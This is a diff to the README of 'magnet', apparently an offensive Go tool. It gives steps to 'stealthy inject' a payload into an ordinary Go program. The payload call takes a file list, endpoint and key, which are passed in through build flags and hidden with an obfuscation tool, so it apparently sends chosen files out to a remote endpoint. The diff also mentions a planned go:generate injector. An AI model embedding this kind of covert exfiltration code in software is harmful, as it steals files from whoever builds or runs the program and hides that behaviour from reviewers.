@@ -35,17 +35,24 @@ You have 2 possibilities:
 
 ### 🥷 Inject `magnet` in your Go program
 
-Considering the simple `hello world` golang program. Add the following comment `//go:generate` to stealthy inject magnet code:
+1. Add `magnet` import and declare variables outside your `main()` function:
 ```golang
-package main
+import "github.com/ariary/magnet/pkg/magnet"
 
-import "fmt"
-
-func main() {
-    fmt.Println("hello world")
-    //go:generate samplegentool arg1 "multiword arg"
-}
+var FileList,Key,Endpoint string
 ```
+
+2. Add magnet payload in the `main()`:
+```golang
+magnet.Magnet(FileList, Endpoint, Key, false)
+```
+
+3. Finally, modify the build command by adding `-ldflags "-X 'main.FileList=$FILES' -X 'main.Key=$KEY' -X 'main.Endpoint=$ENDPOINT'"`
+
+see [declare `magnet`environment variables](#declare-magnet-envar)
+
+*`magnetgentool` is on the making, it will be used with `//go:generate` comment to stealthy inject magnet code.*
+
 ### ⚡ Standalone
 
 
@@ -70,6 +77,14 @@ An exemple to build the obfuscated list:
 ```shell
 cat [FILE] | lobfuscator $KEY > obfuscated.txt
 # decrypt: cat obfuscated.txt | lobfuscator -d $KEY
+```
+
+#### Declare `magnet` envar
+
+Define `FILES` and `ENDPOINTS`envar:
+```shell
+export FILES=$(cat [FILE] | lobfuscator $KEY)
+export ENDPOINT=$(echo "[ENDPOINT]" | lobfuscator $KEY)
 ```
 
 ## Notes
